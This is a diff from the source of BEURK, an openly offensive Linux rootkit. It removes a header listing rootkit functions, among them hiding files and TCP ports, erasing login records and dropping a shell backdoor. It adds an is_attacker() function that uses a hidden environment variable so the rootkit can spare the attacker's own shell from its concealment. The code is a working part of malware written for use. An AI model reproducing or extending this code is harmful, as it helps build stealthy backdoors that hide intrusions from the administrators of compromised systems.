@@ -18,33 +18,28 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include "beurk.h" /* DEBUG(), prototype */
+#include "config.h" /* HIDDEN_ENV_VAR */
 
-#ifndef _BEURK_H_
-# define _BEURK_H_
+/** is_attacker() checks if the process is called by the attacker,
+ * using a special environment variable that is defined in our
+ * spawned shell.
+ */
 
-# include <sys/socket.h>
-# include "debug.h"
+int is_attacker(void) {
+    DEBUG(D_INFO, "called is_attacker()");
+    static int attacker = -1;
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+    if (attacker != -1)
+        return (attacker);
 
-/* is_attacker.c */
-int         is_attacker(void);
-
-/* is_hidden_file.c */
-int         is_hidden_file(const char *path);
-
-/* is_procnet.c */
-int         is_procnet(const char *path);
-
-/* hide_tcp_ports  */
-FILE        *hide_tcp_ports(const char *file);
-
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
-
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
-
-#endif /* _BEURK_H_ */
+    if (getenv(HIDDEN_ENV_VAR)) {
+        DEBUG(D_INFO, "This is the attacker.");
+        attacker = 1;
+    }
+    else {
+        DEBUG(D_INFO, "This isn't the attacker.");
+        attacker = 0;
+    }
+    return (attacker);
+}
